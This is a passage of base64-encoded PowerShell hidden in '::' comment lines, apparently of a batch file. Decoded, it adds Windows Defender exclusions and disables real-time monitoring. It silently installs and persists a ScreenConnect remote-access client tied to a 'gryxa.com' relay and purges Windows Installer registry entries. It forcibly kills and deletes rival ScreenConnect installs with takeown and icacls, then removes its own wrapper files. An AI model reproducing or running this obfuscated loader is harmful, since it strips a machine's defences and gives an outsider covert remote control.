::JG5hbWVzKSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggKEpvaW4t
::UGF0aCAkYmFzZSAkbikgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0K
::ICAgICAgICB9DQogICAgICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBy
::b2Nlc3MgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUnIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIEFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5l
::eGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9IGNhdGNoIHt9DQp9DQoN
::CmZ1bmN0aW9uIENvbnZlcnRUby1QYWNrZWRHdWlkKFtzdHJpbmddJEd1aWQpIHsN
::CiAgICAjIFdpbmRvd3MgSW5zdGFsbGVyIHN0b3JlcyBQcm9kdWN0Q29kZXMgd2l0
::aCByZXZlcnNlZCBzZWdtZW50cyAocGFja2VkL3NxdWlzaGVkIEdVSUQpLg0KICAg
::ICRnID0gJEd1aWQuVHJpbSgne30nKS5SZXBsYWNlKCctJywgJycpDQogICAgJHNi
::ID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyDQogICAgIyBm
::aXJzdCAzIHNlZ21lbnRzIHJldmVyc2VkIHBlci1jaGFyLCBsYXN0IDIgc2VnbWVu
::dHMgcmV2ZXJzZWQgcGVyLWJ5dGUtcGFpcg0KICAgICRzZWdzID0gQCgkZy5TdWJz
::dHJpbmcoMCw4KSwgJGcuU3Vic3RyaW5nKDgsNCksICRnLlN1YnN0cmluZygxMiw0
::KSwgJGcuU3Vic3RyaW5nKDE2LDQpLCAkZy5TdWJzdHJpbmcoMjAsMTIpKQ0KICAg
::IGZvciAoJGk9MDsgJGkgLWx0IDM7ICRpKyspIHsgJGMgPSAkc2Vnc1skaV0uVG9D
::aGFyQXJyYXkoKTsgW2FycmF5XTo6UmV2ZXJzZSgkYyk7IFt2b2lkXSRzYi5BcHBl
::bmQoLWpvaW4gJGMpIH0NCiAgICBmb3IgKCRpPTM7ICRpIC1sdCA1OyAkaSsrKSB7
::ICRzID0gJHNlZ3NbJGldOyBmb3IgKCRqPTA7ICRqIC1sdCAkcy5MZW5ndGg7ICRq
::Kz0yKSB7IFt2b2lkXSRzYi5BcHBlbmQoJHNbJGorMV0pOyBbdm9pZF0kc2IuQXBw
::ZW5kKCRzWyRqXSkgfSB9DQogICAgcmV0dXJuICRzYi5Ub1N0cmluZygpLlRvVXBw
::ZXIoKQ0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtSW5zdGFsbGVyUHJvZHVjdFJlZ2lz
::dHJhdGlvbihbc3RyaW5nXSRQcm9kdWN0Q29kZSkgew0KICAgICMgUHVyZ2UgYSBw
::aGFudG9tL2NvcnJ1cHQgUHJvZHVjdENvZGUgZnJvbSB0aGUgSW5zdGFsbGVyIGRh
::dGFiYXNlIChJbnN0YWxsZWQ9MDA6MDA6MDANCiAgICAjIHJlZ2lzdHJhdGlvbnMg
::dGhhdCBzdXJ2aXZlIEFSUCByZW1vdmFsIGFuZCBtYWtlIC9pIGZhaWwgMTYwMyBp
::biBtYWludGVuYW5jZSBtb2RlKS4NCiAgICBpZiAoLW5vdCAkUHJvZHVjdENvZGUp
::IHsgcmV0dXJuIH0NCiAgICAkcGFja2VkID0gQ29udmVydFRvLVBhY2tlZEd1aWQg
::JFByb2R1Y3RDb2RlDQogICAgJGtleXMgPSBAKA0KICAgICAgICAiSEtMTTpcU09G
::VFdBUkVcQ2xhc3Nlc1xJbnN0YWxsZXJcUHJvZHVjdHNcJHBhY2tlZCIsDQogICAg
::ICAgICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVy
::c2lvblxJbnN0YWxsZXJcVXNlckRhdGFcUy0xLTUtMThcUHJvZHVjdHNcJHBhY2tl
::ZCIsDQogICAgICAgICJIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xD
::dXJyZW50VmVyc2lvblxVbmluc3RhbGxcJFByb2R1Y3RDb2RlIiwNCiAgICAgICAg
::IkhLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1
::cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwkUHJvZHVjdENvZGUiDQogICAgKQ0KICAg
::IGZvcmVhY2ggKCRrIGluICRrZXlzKSB7DQogICAgICAgIGlmIChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRrKSB7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkayAt
::UmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0K
::ICAgIH0NCiAgICAmIHJlZy5leGUgZGVsZXRlICJIS0NSXEluc3RhbGxlclxQcm9k
::dWN0c1wkcGFja2VkIiAvZiAyPiYxIHwgT3V0LU51bGwNCn0NCg0KZnVuY3Rpb24g
::U3RhcnQtR3J5eGFJbnN0YWxsKFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmddJEZw
::LCBbc3RyaW5nXSRMb2dGaWxlKSB7DQogICAgIyBMNDQ6IG5ldmVyIGludGVycnVw
::dCBhbnkgbGl2ZSBHcnl4YTsgbmV2ZXIgL2kgd2hpbGUgdGhpcyBGUCdzIHNlcnZp
::Y2UgZXhpc3RzOyBuZXZlciBkZWZlcnJlZCAveC4NCiAgICBpZiAoRmluZC1SdW5u
::aW5nR3J5eGFGcCkgeyByZXR1cm4gfQ0KICAgIGlmICgkRnAgLWFuZCAoVGVzdC1T
::Y1J1bm5pbmcgJEZwKSkgeyByZXR1cm4gfQ0KICAgIGlmICgkRnAgLWFuZCAoVGVz
::dC1TY1NlcnZpY2VFeGlzdHMgJEZwKSkgew0KICAgICAgICAkbmFtZSA9ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJEZwKSINCiAgICAgICAgJiBzYy5leGUgY29uZmln
::ICRuYW1lIHN0YXJ0PSBhdXRvIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIHNj
::LmV4ZSBzdGFydCAkbmFtZSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgcmV0dXJu
::DQogICAgfQ0KICAgIEFkZC1TY0RlZmVuZGVyRXhjbHVzaW9uICRGcA0KICAgICRz
::YWZlTXNpID0gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZSAkTXNpUGF0aA0KICAgIGlm
::ICgtbm90ICRzYWZlTXNpKSB7IHJldHVybiB9ICAjIHJlZnVzZSBpbnN0YWxsIGlm
::IFVwZ3JhZGUgY2Fubm90IGJlIGNsZWFyZWQNCiAgICAkcGMgPSBHZXQtTXNpUHJv
::cGVydHkgJHNhZmVNc2kgJ1Byb2R1Y3RDb2RlJw0KICAgICRjbWQgPSBKb2luLVBh
::dGggJFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwuY21kJw0KICAgICRzdmNOYW1lID0g
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRnApIg0KICAgICRsaW5lcyA9IEAoJ0Bl
::Y2hvIG9mZicpDQogICAgJGxpbmVzICs9ICdyZWcgYWRkICJIS0xNXFNPRlRXQVJF
::XFBvbGljaWVzXE1pY3Jvc29mdFxXaW5kb3dzXEluc3RhbGxlciIgL3YgRGlzYWJs
::ZU1TSSAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVsIDI+JjEnDQogICAgIyBMNDQg
::cnVudGltZSBndWFyZCBpbiBkZWZlcnJlZCBjbWQg4oCUIGFib3J0IGlmIEdyeXhh
::IGFwcGVhcmVkIHNpbmNlIHdyYXBwZXIgd2FzIHdyaXR0ZW4NCiAgICAkbGluZXMg
::Kz0gInNjIHF1ZXJ5IGAiJHN2Y05hbWVgIiA+bnVsIDI+JjEiDQogICAgJGxpbmVz
::ICs9ICdpZiBub3QgZXJyb3JsZXZlbCAxIChzYyBzdGFydCAiJyArICRzdmNOYW1l
::ICsgJyIgPm51bCAyPiYxICYgZXhpdCAvYiAwKScNCiAgICAkbGluZXMgKz0gJ3Nj
::IHF1ZXJ5IHN0YXRlPSBhbGwgfCBmaW5kc3RyIC9JIC9DOiInICsgJEZwICsgJyIg
::Pm51bCcNCiAgICAkbGluZXMgKz0gJ2lmIG5vdCBlcnJvcmxldmVsIDEgZXhpdCAv
::YiAwJw0KICAgICMgbm8gbXNpZXhlYyAveCBldmVyIGluIGRlZmVycmVkIHdyYXBw
::ZXIgKFRPQ1RPVSBraWxsZWQgbGl2ZSBHdWVzdCkNCiAgICBpZiAoJHBjKSB7DQog
::ICAgICAgICRsaW5lcyArPSAicmVnIGRlbGV0ZSBgIkhLTE1cU09GVFdBUkVcTWlj
::cm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXCRwY2AiIC9m
::ID5udWwgMj4mMSINCiAgICAgICAgJGxpbmVzICs9ICJyZWcgZGVsZXRlIGAiSEtM
::TVxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50
::VmVyc2lvblxVbmluc3RhbGxcJHBjYCIgL2YgPm51bCAyPiYxIg0KICAgIH0NCiAg
::ICAkbGluZXMgKz0gIm1zaWV4ZWMgL2kgYCIkc2FmZU1zaWAiIC9xbiAvbm9yZXN0
::YXJ0IEFMTFVTRVJTPTEgUkVCT09UPVJlYWxseVN1cHByZXNzIC9MKnYgYCIkTG9n
::RmlsZWAiIg0KICAgICRsaW5lcyArPSAic2MgY29uZmlnIGAiJHN2Y05hbWVgIiBz
::dGFydD0gYXV0byINCiAgICAkbGluZXMgKz0gInNjIGZhaWx1cmUgYCIkc3ZjTmFt
::ZWAiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzMwMDAvcmVzdGFydC8z
::MDAwL3Jlc3RhcnQvMzAwMCINCiAgICAkbGluZXMgKz0gInNjIHN0YXJ0IGAiJHN2
::Y05hbWVgIiINCiAgICBmb3JlYWNoICgkc2sgaW4gKEdldC1TZXZyektlZXApKSB7
::DQogICAgICAgICRsaW5lcyArPSAic2MgY29uZmlnIGAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCRzaylgIiBzdGFydD0gYXV0byA+bnVsIDI+JjEiDQogICAgICAgICRs
::aW5lcyArPSAic2Mgc3RhcnQgYCJTY3JlZW5Db25uZWN0IENsaWVudCAoJHNrKWAi
::ID5udWwgMj4mMSINCiAgICB9DQogICAgJHJlc3VsdEZpbGUgPSBKb2luLVBhdGgg
::JFdvcmtEaXIgJ2dyeXhhX2luc3RhbGwucmVzdWx0Jw0KICAgICRsaW5lcyArPSAi
::ZWNobyAlRVJST1JMRVZFTCU+YCIkcmVzdWx0RmlsZWAiIg0KICAgICRsaW5lcyAr
::PSAiZGVsIC9mIC9xIGAiJHNhZmVNc2lgIiA+bnVsIDI+JjEiDQogICAgJGxpbmVz
::ICs9ICJkZWwgL2YgL3EgYCIkY21kYCIgPm51bCAyPiYxIg0KICAgICRsaW5lcyAr
::PSAnZXhpdCcNCiAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGNtZCAtVmFs
::dWUgJGxpbmVzIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCiAgICBTdGFydC1Qcm9j
::ZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlzdCAiL2MgYCIkY21kYCIiIC1XaW5kb3dT
::dHlsZSBIaWRkZW4NCn0NCg0KZnVuY3Rpb24gTWFyay1Hcnl4YVJlaW5zdGFsbCB7
::DQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtE
::aXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJykgLVZhbHVlIChHZXQtRGF0ZSkuVG9V
::bml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSAtRW5jb2RpbmcgQVNDSUkgLUZv
::cmNlDQp9DQoNCmZ1bmN0aW9uIEdldC1Hcnl4YU1pZ3JhdGVPbGRQYXRoIHsgSm9p
::bi1QYXRoICRXb3JrRGlyICdncnl4YV9taWdyYXRlX29sZC50eHQnIH0NCg0KZnVu
::Y3Rpb24gU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQoW3N0cmluZ1tdXSRPbGRGcHMsIFtz
::dHJpbmddJE5ld0ZwKSB7DQogICAgJG9sZHMgPSBAKCRPbGRGcHMgfCBXaGVyZS1P
::YmplY3QgeyAkXyAtYW5kICgkXyAtbmUgJE5ld0ZwKSB9IHwgU2VsZWN0LU9iamVj
::dCAtVW5pcXVlKQ0KICAgIGlmICgtbm90ICRvbGRzLkNvdW50KSB7DQogICAgICAg
::IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAoR2V0LUdyeXhhTWlncmF0ZU9sZFBh
::dGgpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
::ICByZXR1cm4NCiAgICB9DQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChH
::ZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkgLVZhbHVlICRvbGRzIC1FbmNvZGluZyBB
::U0NJSSAtRm9yY2UNCn0NCg0KZnVuY3Rpb24gQ29tcGxldGUtR3J5eGFNaWdyYXRl
::T2xkIHsNCiAgICAjIEw0NDogTkVWRVIgYXV0by11bmluc3RhbGwgb2xkIEdyeXhh
::IEZQIOKAlCB0aGF0IGRyb3BwZWQgbGl2ZSBHdWVzdHMgc3RpbGwgb24gb2xkIEZQ
::Lg0KICAgICMgS2VlcCB0aGUgZmxhZyBmb3IgdmlzaWJpbGl0eTsgb3BlcmF0b3Iv
::bWFudWFsIGNsZWFudXAgb25seS4NCiAgICAkcCA9IEdldC1Hcnl4YU1pZ3JhdGVP
::bGRQYXRoDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHAp
::KSB7IHJldHVybiB9DQogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnZ3J5
::eGFfZW5zdXJlLmxvZycNCiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxv
::ZyAtVmFsdWUgKCd7MH0gbWlncmF0ZV9jbGVhbnVwX1NLSVBQRURfTDQ0IChrZWVw
::IGR1YWwtRlA7IG5ldmVyIC94IGxpdmUgR3J5eGEpJyAtZiAoR2V0LURhdGUgLUZv
::cm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpKSAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZQ0KICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkcCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCn0NCg0KZnVuY3Rpb24g
::U3RhcnQtR3J5eGFNaWdyYXRlKFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmddJE5l
::d0ZwLCBbc3RyaW5nW11dJE9sZEZwcywgW3N0cmluZ10kUmVhc29uKSB7DQogICAg
::IyBMNDI6IHNpYmxpbmctc2FmZSAvaSBvZiBOZXdGcCBGSVJTVCDigJQga2VlcCBP
::bGRGcHMgUnVubmluZyB1bnRpbCBDb21wbGV0ZS1Hcnl4YU1pZ3JhdGVPbGQuDQog
::ICAgU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQgJE9sZEZwcyAkTmV3RnANCiAgICBDbGVh
::ci1Hcnl4YUFycCAkTmV3RnANCiAgICBTZXQtR3J5eGFGcCAkTmV3RnANCiAgICBT
::dGFydC1Hcnl4YUluc3RhbGwgJE1zaVBhdGggJE5ld0ZwIChKb2luLVBhdGggJFdv
::cmtEaXIgJ21zaV9ncnl4YV9kZXRhY2hlZC5sb2cnKQ0KICAgIE1hcmstR3J5eGFS
::ZWluc3RhbGwNCiAgICByZXR1cm4gIklORkxJR0hUfCROZXdGcHwkUmVhc29uIg0K
::fQ0KDQpmdW5jdGlvbiBJbnZva2UtR3J5eGFFbnN1cmUgew0KICAgICMgTDQ2IEZS
::RUVaRTogbmV2ZXIgbXNpZXhlYyBmcm9tIG1vbi9ib290L2ZvcmNlLWZsYWcuIFN0
::YXJ0LW9ubHkuIE1hbnVhbCBvd25fZ3J5eGFfZm9yY2UgZm9yIGluc3RhbGwuDQog
::ICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7
::IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZv
::cmNlIHwgT3V0LU51bGwgfQ0KICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
::J2dyeXhhX2Vuc3VyZS5sb2cnDQogICAgZnVuY3Rpb24gR0xvZyhbc3RyaW5nXSRt
::KSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoJ3swfSB7
::MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyks
::ICRtKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQoNCiAgICBmb3Jl
::YWNoICgkc3RhbGUgaW4gQCgnZ3J5eGFfaW5zdGFsbC5jbWQnLCAnZ3J5eGFfbXNp
::LmxvY2snLCAnb3duX2dyeXhhLmxvY2snKSkgew0KICAgICAgICAkcCA9IEpvaW4t
::UGF0aCAkV29ya0RpciAkc3RhbGUNCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJHApIHsNCiAgICAgICAgICAgIEdMb2cgImw0Nl9hYm9ydF9zdGFs
::ZSAkc3RhbGUiDQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGgg
::JHAgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAg
::IH0NCiAgICB9DQoNCiAgICAkZnAgPSBHZXQtR3J5eGFGcA0KICAgICRleHAgPSAk
::c2NyaXB0OkdyeXhhRXhwZWN0ZWRGcA0KICAgIGlmICgtbm90ICRleHApIHsgJGV4
::cCA9ICRmcCB9DQoNCiAgICAkcnVubmluZyA9IEZpbmQtUnVubmluZ0dyeXhhRnAN
::CiAgICBpZiAoJHJ1bm5pbmcpIHsNCiAgICAgICAgU2V0LUdyeXhhRnAgJHJ1bm5p
::bmcNCiAgICAgICAgR0xvZyAibDQ2X2xpdmVfb2sgZnA9JHJ1bm5pbmcgZm9yY2U9
::JEZvcmNlIGRlZXA9JERlZXAiDQogICAgICAgIGlmICgkRGVlcCkgew0KICAgICAg
::ICAgICAgJHRjcFIgPSBUZXN0LVRjcEhvc3RQb3J0ICRzY3JpcHQ6R3J5eGFSZWxh
::eUhvc3QgNDQzDQogICAgICAgICAgICAkdGNwVSA9IFRlc3QtVGNwSG9zdFBvcnQg
::JHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMNCiAgICAgICAgICAgIHJldHVybiAiSEVB
::TFRIWXwkcnVubmluZ3xydW5uaW5nPTF8ZGVlcD0xfHJlbGF5PSR0Y3BSfHVpPSR0
::Y3BVfGZyZWV6ZT0xIg0KICAgICAgICB9DQogICAgICAgIHJldHVybiAiSEVBTFRI
::WXwkcnVubmluZ3xydW5uaW5nPTF8ZnJlZXplPTEiDQogICAgfQ0KDQogICAgZm9y
::ZWFjaCAoJHRyeUZwIGluIEAoJGV4cCwgJGZwKSB8IFdoZXJlLU9iamVjdCB7ICRf
::IH0gfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUpIHsNCiAgICAgICAgaWYgKC1ub3Qg
::KFRlc3QtU2NTZXJ2aWNlRXhpc3RzICR0cnlGcCkpIHsgY29udGludWUgfQ0KICAg
::ICAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJHRyeUZwKSINCiAg
::ICAgICAgR0xvZyAibDQ2X3N0YXJ0X29ubHkgZnA9JHRyeUZwIg0KICAgICAgICAm
::IHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxs
::DQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRuYW1lIDI+JjEgfCBPdXQtTnVsbA0K
::ICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1DQogICAgICAgIGlmIChUZXN0
::LVNjUnVubmluZyAkdHJ5RnApIHsNCiAgICAgICAgICAgIFNldC1Hcnl4YUZwICR0
::cnlGcA0KICAgICAgICAgICAgcmV0dXJuICJIRUFMVEhZfCR0cnlGcHxzdGFydGVk
::PTF8ZnJlZXplPTEiDQogICAgICAgIH0NCiAgICB9DQoNCiAgICBHTG9nICJsNDZf
::YWJzZW50X25vX2F1dG9faW5zdGFsbCB0YXJnZXQ9JGV4cCINCiAgICByZXR1cm4g
::IlVOSEVBTFRIWXwkZXhwfGFic2VudC1mcmVlemUtbm8taW5zdGFsbCINCn0NCg0K
::ZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsNCiAgICAjIEw0NTogSEFORFMt
::T0ZGIOKAlCBkbyBub3QgdG91Y2ggYW55IFNjcmVlbkNvbm5lY3Qgd2hpbGUgZGlh
::Z25vc2luZyBkaXNjb25uZWN0cy4NCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3Jr
::RGlyICdleHRlcm1pbmF0ZS5sb2cnDQogICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQ
::YXRoICRsb2cgLVZhbHVlICgnezB9IGV4dGVybWluYXRlX1NLSVBQRURfTDQ1IGhh
::bmRzLW9mZi1hbGwtc2MnIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRk
::IEhIOm1tOnNzJykpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::cmV0dXJuICdTS0lQfGhhbmRzLW9mZi1zYy1MNDUnDQogICAgIyBMNzogdHJ1ZSBy
::ZW1vdmFsIChkaXNhYmxlZCkuLi4NCiAgICAkcnVubmluZ0cgPSBGaW5kLVJ1bm5p
::bmdHcnl4YUZwDQogICAgaWYgKCRydW5uaW5nRykgeyBTZXQtR3J5eGFGcCAkcnVu
::bmluZ0cgfQ0KICAgICRrZWVwID0gQChHZXQtS2VlcEZpbmdlcnByaW50cykNCiAg
::ICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBwcm9kdWN0ID0g
::MDsgcm1tID0gMDsgZmFpbCA9IDAgfQ0KICAgIGZ1bmN0aW9uIExvZyhbc3RyaW5n
::XSRtKSB7DQogICAgICAgICRsaW5lID0gJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAt
::Rm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtDQogICAgICAgIEFkZC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAjIE80MTogZG8gTk9UIFdyaXRl
::LU91dHB1dCBMb2cgbGluZXMgKHBvbGx1dGVzIGZvciAvZiBjYWxsZXJzKQ0KICAg
::IH0NCiAgICAjIFByb3RlY3QgR3J5eGEgZHVyaW5nIHN0YXJ0IHJhY2U6IG9ubHkg
::bGl2ZSBTQyBwcm9jcyB3aXRoIHZlcmlmaWVkIEdyeXhhIHJlbGF5L0ZQDQogICAg
::R2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtl
::ICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkYmxvYiA9ICIkKFtzdHJpbmdd
::JF8uRXhlY3V0YWJsZVBhdGgpICQoW3N0cmluZ10kXy5Db21tYW5kTGluZSkiDQog
::ICAgICAgIGlmICgkYmxvYiAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwo
::KFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAgICAgICAgICAgICRmcCA9ICRNYXRj
::aGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAgICAgaWYgKCRmcCAtbm90aW4gJHNj
::cmlwdDpTZXZyektlZXAgLWFuZCAoVGVzdC1Jc0dyeXhhRnAgJGZwKSAtYW5kICRm
::cCAtbm90aW4gJGtlZXApIHsNCiAgICAgICAgICAgICAgICAka2VlcCArPSAkZnAN
::CiAgICAgICAgICAgICAgICBTZXQtR3J5eGFGcCAkZnANCiAgICAgICAgICAgICAg
::ICBMb2cgImtlZXBfYWRkX2Zyb21fcHJvYyBmcD0kZnAiDQogICAgICAgICAgICB9
::DQogICAgICAgIH0NCiAgICB9DQogICAgZnVuY3Rpb24gSXMtS2VlcGVyKFtzdHJp
::bmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9
::DQogICAgICAgICMgYWxsb3cgaWYgcmVsYXkgc2VydmVyL2RvbWFpbiBpcyBHcnl4
::YSBPUiBmaW5nZXJwcmludCBpcyBhIGtlZXBlcg0KICAgICAgICBpZiAoJHMgLW1h
::dGNoICcoP2kpZ3J5eGFcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAg
::Zm9yZWFjaCAoJGsgaW4gJGtlZXApIHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyBy
::ZXR1cm4gJHRydWUgfSB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQog
::ICAgZnVuY3Rpb24gRm9yY2UtUmVtb3ZlRGlyKFtzdHJpbmddJGQpIHsNCiAgICAg
::ICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
::JGQpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgICAgIEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAg
::ICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRoIC1hbmQg
::JF8uRXhlY3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCwgW1N0cmluZ0NvbXBhcmlz
::b25dOjpPcmRpbmFsSWdub3JlQ2FzZSkgfSB8DQogICAgICAgICAgICBGb3JFYWNo
::LU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgICMgdW4taGFy
::ZCBzZWxmLXByb3RlY3RlZCBkaXJzIChmb3JlaWduL29sZCBTQyBsb2NrcyBBQ0xz
::K2F0dHJzIHRvIHN1cnZpdmUgcmVtb3ZhbCkNCiAgICAgICAgJiB0YWtlb3duLmV4
::ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIGljYWNs
::cy5leGUgJGQgL3Jlc2V0IC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbA0KICAgICAg
::ICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZGAiIGAiJGRc
::Ki4qYCIiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAmIGljYWNscy5leGUgJGQg
::L2dyYW50ICcqUy0xLTUtMzItNTQ0OihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8
::IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0FkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ1NZU1RFTTooT0kpKENJKUYn
::IC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICBSZW1vdmUtSXRlbSAt
::TGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlDQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRo
::ICRkKSB7DQogICAgICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMgLXIg
::L3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICBj
::bWQuZXhlIC9jICJybWRpciAvcyAvcSBgIiRkYCIiIDI+JjEgfCBPdXQtTnVsbA0K
::ICAgICAgICB9DQogICAgICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRk
::KSB7DQogICAgICAgICAgICAkZW1wdHkgPSBKb2luLVBhdGggJGVudjpURU1QICgi
